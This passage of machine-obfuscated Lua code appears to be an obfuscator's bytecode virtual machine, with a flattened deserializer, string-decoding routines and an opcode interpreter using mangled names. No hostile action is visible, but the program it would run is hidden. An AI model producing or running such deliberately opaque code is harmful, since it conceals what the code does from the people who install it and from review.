bw=(bw+cu)if not((bw~=ct))then break else return by end end end else if cs>1 then cy=((cy-bk)%bs)else cx=cx+cu end end else if cs<=3 then if((((cy%bi)==bj)or((cy%bi)>bj)))then local bi=cw while true do bi=(bi+cu)if((bi==ct or(bi>ct)))then if(bi<bh)then return cc else break end else cy=(cy*bg)%be end end else local be=cw while true do be=((be+cu))if(be<ct)then return by(bz(ce and bz,by and bz,((cc and by)),by),(ce(bz,ce,bz,(cc and ce))and cc(cc,ce,cc,cc)),(cc(ce,(by and ce),by,ce)and bz(by,(by and by),cc,bz)),cc(cc,ce,((bz and ce)),cc))else break end end end else if 5>cs then return by(cc(cc,bz,(cc and by),ce),ce(cc,cc,ce,by),by(ce,ce,bz,by),bz(by,((by and by)),cc,ce))else break end end end cs=cs+1 end end,function(be,bg,bi,bj)local bk=0 while true do if bk<=2 then if bk<=0 then if(cx>bf)then local bf=cw while true do bf=bf+cu if(bf<ct)then return bj else break end end end else if bk~=2 then cx=cx+cu else cy=((cy+y)%x)end end else if bk<=3 then if((cy%v)>w or(cy%v)==w)then local v=cw while true do v=(v+cu)if(v<cu or v==cu)then cy=((cy-ca)%s)else if not(not(v==bh))then break else return bj end end end else local s=cw while true do s=((s+cu))if not(not(s==ct))then break else return bi(be(bi,(be and bi),bg,bj),((bj(bi,be,bg,bi)and bg(bj,bj and bi,bg,bi and bj))),bi(bg,bi,be,bi),bg(bg,bj,bg,bg))end end end else if bk~=5 then return be(bi(bg and bj,bg,(bg and be),(bj and bi)),bj(be,bi,bj,bi),bj((bj and bi),(bi and bi),bg,bi),be(bi,bj,bg,bj))else break end end end bk=bk+1 end end,function(s,v,w,x)local y=0 while true do if y<=2 then if y<=0 then if cx>q then local q=cw while true do q=q+cu if(q<ct)then return x else break end end end else if 1==y then cx=cx+cu else cy=((cy*p)%d)end end else if y<=3 then if(((cy%c)>b))then local b=cw while true do b=b+cu if((b<ct))then return s(w(x,s,s,((v and w))),(s(s,w,v,(v and s))and x(v,x,x,v)),v(s,x,s,((w and s))),(w(s,w,s,w)and s(v,w,s,(s and x))))else break end end else local b=cw while true do b=b+cu if not(b~=ct)then break else return v end end end else if y<5 then return x else break end end end y=y+1 end end)else if 31==a then return cy;else break end end end end end end a=a+1 end end)());else ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if a~=1 then b,c=cf(),cf()else if b==0 and c==0 then return 0;end;end else if 2==a then d=1 else p=((cd(c,1,20)*(2^32))+b)end end else if a<=5 then if a<5 then q=cd(c,21,31)else s=(((-1)^cd(c,32)))end else if a<=6 then if(q==0)then if(not(p~=0))then return s*0;else q=1;d=0;end;elseif(not(q~=2047))then if(p==0)then return(s*((1/0)));else return(s*(0/0));end;end;else if 7==a then return((s*2^((q-1023)))*((d+(p/(2^52)))))else break end end end end a=a+1 end end end else if bd<=29 then cl="\46"else if 31>bd then cm=function()local a,b,c=0 while true do if a<=1 then if a~=1 then b,c=h(bn,br,(br+2))else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=br+2;else if 4~=a then return(bv(c,8))+b;else break end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if 33>bd then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if 2>a then c=157 else d=0 end end else if a<=3 then p={}else if a>4 then break else while d<8 do d=d+1;while d<707 and c%1622<811 do c=(((c*35)))local q=d+c if((c%16522)<8261)then c=(c*19)while((d<828)and(c%658)<329)do c=((c+60))local q=d+c if((((c%18428))==9214 or((((c%18428)))<9214)))then c=(((c-50)))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not(not(q==0))then return g;end;b=j(bn,br,((br+q)-1));br=(br+q);return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if(0<v)then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif(c%4~=0)then c=(c-67)local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1<s then break else while true do if not(v==1)then return i(h(q))else break end v=(v+1)end end end s=s+1 end end);end else c=(c*88)d=d+1 local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if 1>v then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=((d+1));end elseif not(not(c%4~=0))then c=((c-48))while((d<859)and(c%1392<696))do c=((c*39))local q=((d+c))if((c%58)<29)then c=((c+5))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if v>0 then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(not((c%4)~=0))then c=((c*56))local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if v>0 then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end else c=((c*9))d=(d+1)local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1<s then break else while true do if not(1==v)then return i(h(q))else break end v=(v+1)end end end s=s+1 end end);end end;d=(d+1);end else c=((c-51))d=(d+1)while((d<663)and((c%936)<468))do c=(((c*12)))local q=(d+c)if((((c%18532))==9266 or((c%18532))>9266))then c=((c*71))local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s~=2 then while true do if v>0 then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(not(c%4~=0))then c=((c-18))local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s~=2 then while true do if not(1==v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end else c=((c*35))d=((d+1))local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if 1==p then while true do if q==0 then return i(h(b))else break end q=(q+1)end else break end end p=p+1 end end);end end;d=d+1;end end;d=d+1;end c=(c-494)if((d>43))then break;end;end;end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if 1>a then return{...},n("\35",...)else break end a=a+1 end end else if 36>bd then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if a>0 then q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})else b,c,d,p={},{},{},{}end else if a<=2 then s={}else if 3==a then v=490 else w=0 end end end else if a<=6 then if a~=6 then x={}else while w<3 do w=((w+1));while((w<481 and(v%320)<160))do v=(v*62)local d=w+v if(v%916)>458 then v=((v-88))while((w<318))and(v%702<351)do v=((v*8))local d=((w+v))if(v%14064)>7032 then v=((v*81))local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4)==0)then v=((v*37))local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+10))w=((w+1))local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not((j~=1)))then s[d]=nil;elseif(not(j~=3))then s[d]=(not(not(cg()~=0)));elseif((not(j~=0)))then s[d]=ck();elseif(not(not(j==2)))then s[d]=co();end;end;q[cj]=s;end end;w=w+1;end elseif not(not(((v%4))~=0))then v=(((v*65)))while(w<615 and v%618<309)do v=((v-33))local d=w+v if(((v%15582)>7791))then v=((v*14))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4==0))then v=((v+51))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+53))w=(w+1)local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end else v=(v+7)w=w+1 while(w<127 and v%1548<774)do v=((v-37))local d=(w+v)if((v%19188)>9594)then v=((v*61))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(v%4==0)then v=(v+25)local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+42)))w=((w+1))local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end end;w=(w+1);end v=((v*482))if(w>56)then break;end;end;end else if a<=7 then for d=1,cf()do c[d-1]=cr();end;else if a>8 then w=0 else v=674 end end end end else if a<=14 then if a<=11 then if 11~=a then x={}else while(w<5)do w=w+1;while w<91 and(v%778<389)do v=((v*69))local c=(w+v)if(not(((v%9088))~=4544)or((((v%9088)))>4544))then v=((v-75))while(((w<631)and(((v%1604)<802))))do v=(((v*54)))local c=(w+v)if(((v%16436)<8218))then v=((v+28))local c=16198 if not x[c]then x[c]=1;end elseif not((v%4==0))then v=(((v*39)))local c=51865 if not x[c]then x[c]=1;end else v=(((v-90)))w=(w+1)local c=48962 if not x[c]then x[c]=1;end end;w=(w+1);end elseif(v%4~=0)then v=((v-71))while((((w<101))and((v%1004<502))))do v=((v+41))local c=(w+v)if((((v%5668)))>2834)then v=(((v-75)))local c=14417 if not x[c]then x[c]=1;end elseif not(not(v%4~=0))then v=((v*39))local c=82431 if not x[c]then x[c]=1;local c=1;local d=2;local j=3;local p=4;for p=1,cf()do local y=cg();local bb=cd(y,c,c);if((not(not(bb==0))))then local y,bb,be=cd(y,d,j),cd(y,4,6),m({[70]=cm(),[514]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(y,d,j);end,})if(not((y~=0)))or((not(y~=c)))then be[14]=cf();if(not((y~=0)))then be[463]=cf();end;elseif((y==d)or(y==j))then be[14]=((cf()-(e)));if(not(not(not(y~=j))))then be[463]=cm();end;end;if(not(((cd(bb,c,c)~=c))))then be[514]=s[be[514]];end;if(not(not(cd(bb,d,d)==c)))then be[14]=s[be[14]];end;if(not(not((cd(bb,j,j)==c))))then be[463]=s[be[463]];end;b[p]=be;end;end;end else v=(((v*20)))w=(w+1)local b=1356 if not x[b]then x[b]=1;end end;w=w+1;end else v=(v+14)w=(w+1)while(w<750 and v%1490<745)do v=((v-11))local b=(w+v)if(((v%2936))>1468)then v=((v-14))local b=87756 if not x[b]then x[b]=1;end elseif not(not((v%4)~=0))then v=((v+67))local b=19927 if not x[b]then x[b]=1;end else v=((v+77))w=w+1 local b=91772 if not x[b]then x[b]=1;end end;w=(w+1);end end;w=w+1;end v=((v*259))if w>75 then break;end;end;end else if a<=12 then q[481]=cg();else if a==13 then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[514],b[14],b[463]if not((bp(c)~=f))then c=z(c,cl,function(j,p,p)local p,s=0 while true do if p<=0 then s=0 else if p<2 then while true do if 1>s then return i(bu(h(j),cb))else break end s=(s+1)end else break end end p=p+1 end end)b[514]=c end if not((bp(d)~=f))then d=z(d,cl,function(c,j,j,j)local j,p=0 while true do if j<=0 then p=0 else if j<2 then while true do if not(0~=p)then return i(bu(h(c),cb))else break end p=p+1 end else break end end j=j+1 end end)b[14]=d end if not((bp(e)~=f))then e=z(e,cl,function(c,d,d,d,d)local d,j=0 while true do if d<=0 then j=0 else if d<2 then while true do if not(j~=0)then return i(bu(h(c),cb))else break end j=(j+1)end else break end end d=d+1 end end)b[463]=e end;end;q[cj]=nil;end;else v=807 end end end else if a<=16 then if a==15 then w=0 else x={}end else if a<=17 then while((w<4))do w=w+1;while((w<304 and v%744<372))do v=(v-34)local b=((w+v))if((((v%5100)))>2550)then v=(((v+54)))while w<185 and((v%1284<642))do v=(v-76)local b=(w+v)if((v%8996)<=4498)then v=(((v+94)))local b=6229 if not x[b]then x[b]=1;return q end elseif(v%4~=0)then v=(v-41)local b=97733 if not x[b]then x[b]=1;return q end else v=(((v*68)))w=w+1 local b=70141 if not x[b]then x[b]=1;return q end end;w=w+1;end elseif not((v%4==0))then v=(((v-61)))while(((w<404)and(v%328<164)))do v=((v+57))local b=(w+v)if(((v%4146))==2073 or((v%4146))>2073)then v=(v*48)local b=96371 if not x[b]then x[b]=1;end elseif not(not(((v%4))~=0))then v=((v*69))local b=48090 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if 1<b then break else while true do if(c==2 or c<2)then if c<=0 then d=n(1,...)else if not(c~=1)then e=({...})else do for d=0,#e do if(bp(e[d])==bq)then for i,i in o,e[d]do if((bp(i)==bp(g)))then t(bo,i)end end else t(bo,e[d])end end end end end else if(c==3 or c<3)then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if 1==i then while true do if(j==1 or j<1)then if j~=1 then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if 3>j then return false else break end end j=(j+1)end else break end end i=i+1 end end else if(5>c)then for d=0,#e do if((bp(e[d])==bq))then return h(e[d])end end else break end end end c=c+1 end end end b=b+1 end end end else v=((v+47))w=((w+1))local b=67766 if not x[b]then x[b]=1;return q end end;w=w+1;end else v=(((v-74)))w=(w+1)while(w<272 and v%1880<940)do v=(((v+29)))local b=(w+v)if((not((((v%6632)))~=3316)or((((v%6632)))>3316)))then v=(v*94)local b=81757 if not x[b]then x[b]=1;return q end elseif(not(v%4==0))then v=(((v*27)))local b=18580 if not x[b]then x[b]=1;return q end else v=((v-7))w=w+1 local b=13150 if not x[b]then x[b]=1;return q end end;w=(w+1);end end;w=((w+1));end v=((v-969))if(w>52)then break;end;end;else if a>18 then break else return q;end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[70];if 189>=z then if 94>=z then if 46>=z then if z<=22 then if 10>=z then if z<=4 then if 1>=z then if z==0 then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif 2>=z then local ba;w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()elseif 4>z then local ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif z<=7 then if z<=5 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end elseif z~=7 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];bc=y[14];bb=y[463];ba=k(w,g,bc,bb);w[y[514]]=ba;end;elseif z<=8 then local ba=y[514]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;elseif z<10 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end else local ba=y[14];local bb=y[463];local ba=k(w,g,ba,bb);w[y[514]]=ba;end;elseif z<=16 then if 13>=z then if 11>=z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif 12==z then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];ba=y[514]w[ba](r(w,ba+1,y[14]))else w[y[514]][y[14]]=y[463];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];end;elseif 14>=z then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end elseif z==15 then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else w[y[514]][y[14]]=y[463];end;elseif 19>=z then if 17>=z then w[y[514]]();elseif z==18 then local ba=y[514]w[ba]=w[ba]()else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=20 then local ba=y[514];local bb=y[463];local bc=ba+2;local bd={w[ba](w[ba+1],w[bc])};for be=1,bb do w[bc+be]=bd[be];end local ba=w[ba+3];if ba then w[bc]=ba;n=y[14];else n=n+1 end;elseif 22~=z then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end else w[y[514]]={r({},1,y[14])};end;elseif z<=34 then if 28>=z then if 25>=z then if 23>=z then local ba;w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif z>24 then w[y[514]]=false;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];if(w[y[514]]~=y[463])then n=n+1;else n=y[14];end;else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end end;elseif 26>=z then local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif 28~=z then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;local bb;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];bb=y[514];ba=w[bb];for bc=bb+1,y[14]do t(ba,w[bc])end;end;elseif 31>=z then if 29>=z then local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif z>30 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];ba=y[514]w[ba](w[ba+1])else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=32 then local ba=w[y[463]];if not ba then n=n+1;else w[y[514]]=ba;n=y[14];end;elseif z==33 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];bc=y[14];bb=y[463];ba=k(w,g,bc,bb);w[y[514]]=ba;else local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif 40>=z then if 37>=z then if z<=35 then w[y[514]]=(w[y[14]]/y[463]);elseif 36==z then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif 38>=z then local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif z>39 then local ba=y[514];do return w[ba](r(w,ba+1,y[14]))end;else local ba;w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif z<=43 then if z<=41 then local ba=y[514]local bb,bc=i(w[ba](r(w,ba+1,y[14])))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;elseif z<43 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif z<=44 then local ba=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then w={};else if 2>ba then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else n=n+1;end end else if ba<=4 then if ba>3 then w[y[514]]=h[y[14]];else y=f[n];end else if 6>ba then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if 8~=ba then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if ba>9 then w[y[514]]=h[y[14]];else y=f[n];end end else if ba<=12 then if ba>11 then y=f[n];else n=n+1;end else if ba~=14 then w[y[514]]={};else n=n+1;end end end end else if ba<=21 then if ba<=17 then if ba<=15 then y=f[n];else if ba>16 then n=n+1;else w[y[514]]={};end end else if ba<=19 then if ba>18 then w[y[514]][y[14]]=w[y[463]];else y=f[n];end else if 20<ba then y=f[n];else n=n+1;end end end else if ba<=25 then if ba<=23 then if ba~=23 then w[y[514]]=j[y[14]];else n=n+1;end else if ba~=25 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end else if ba<=27 then if ba>26 then y=f[n];else n=n+1;end else if 28==ba then if w[y[514]]then n=n+1;else n=y[14];end;else break end end end end end ba=ba+1 end elseif z~=46 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for 